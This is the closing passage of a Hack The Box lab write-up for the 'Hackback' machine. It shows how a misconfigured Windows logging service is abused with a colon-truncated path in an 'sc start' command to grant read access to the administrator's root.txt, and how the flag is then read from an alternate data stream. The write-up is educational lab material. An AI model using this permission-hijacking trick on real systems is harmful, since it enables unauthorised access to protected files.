<p>It’s readable by everyone. This means we can use this service to read anything we don’t have access to, but how will we do that ? it adds <code>.log</code> after the file name ..<br>Since windows doesn’t accept <code>:</code> in filenames we can try to read <code>root.txt</code> like this : <code>sc start userlogger C:\users\administrator\desktop\root.txt:</code><br>When it tries to add <code>.log</code> everything after <code>:</code> will be removed and the new permissions will be applied to <code>root.txt</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; cmd &#x2F;c &quot;sc start userlogger &#39;c:\users\administrator\desktop\root.txt:&#39;&quot;</span><br><span class="line">cmd &#x2F;c &quot;sc start userlogger &#39;c:\users\administrator\desktop\root.txt:&#39;&quot;</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: userlogger</span><br><span class="line">        TYPE               : 10  WIN32_OWN_PROCESS</span><br><span class="line">        STATE              : 2  START_PENDING</span><br><span class="line">                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)</span><br><span class="line">        WIN32_EXIT_CODE    : 0  (0x0)</span><br><span class="line">        SERVICE_EXIT_CODE  : 0  (0x0)</span><br><span class="line">        CHECKPOINT         : 0x0</span><br><span class="line">        WAIT_HINT          : 0x7d0</span><br><span class="line">        PID                : 1368  </span><br><span class="line">        FLAGS              :</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/hackback/30.png" alt=""><br>It worked and we are able to read <code>root.txt</code>. But what is this ? A troll ?<br>Just like bighead I suspected that it had an alternate data stream, but without using <code>streams.exe</code> I tried some stuff and one of my guesses worked :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat c:\users\administrator\desktop\root.txt:flag.txt</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/hackback/31.png" alt=""><br>And we owned root !<br>That’s it , Feedback is appreciated !<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener">@Ahm3d_H3sham</a><br>Thanks for reading.</p>
<p>Previous Hack The Box write-up : <a href="/hack-the-box/netmon/">Hack The Box - Netmon</a><br>Next Hack The Box write-up : <a href="/hack-the-box/friendzone/">Hack The Box - Friendzone</a></p>

</div>


  <div class="book-comments">
    




  </div>



<script src="/js/book-post.js"></script>

        </div>
      </div>
      <div class="column col-2 hide-lg">
        <div class="book-post-info">
  
    <div class="book-post-meta">

  <div class="author">

    <!-- Author image -->
    <div class="author-img">
      
        <figure class="avatar avatar-lg">
          <img src="/avatar.jpg" alt="...">
        </figure>
      
    </div>

    <!-- Author title -->
    <div class="author-title">
      <div>0xRick</div>
      <div>2019-07-06</div>
    </div>
  </div>

  
    <div class="divider"></div>

    <div class="link">
      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>

      <a class="tag-link" href="/tags/php/" rel="tag">#php</a> <a class="tag-link" href="/tags/pivoting/" rel="tag">#pivoting</a> <a class="tag-link" href="/tags/rce/" rel="tag">#rce</a> <a class="tag-link" href="/tags/web/" rel="tag">#web</a> <a class="tag-link" href="/tags/windows/" rel="tag">#windows</a> <a class="tag-link" href="/tags/windows-exploitation/" rel="tag">#windows-exploitation</a>
    </div>
    
  

  <div class="divider"></div>
</div>
  

  <div class="book-tocbot">
</div>
<div class="book-tocbot-menu">
  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
  <a onclick="go_top()">Back to top</a>
  <a onclick="go_bottom()">Go to bottom</a>
</div>


<script src="/js/book-toc.js"></script>

</div>
      </div>
    </div>
  </div>
  
  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
</div>

</body>
</html>


<script src="/js/book.js"></script>
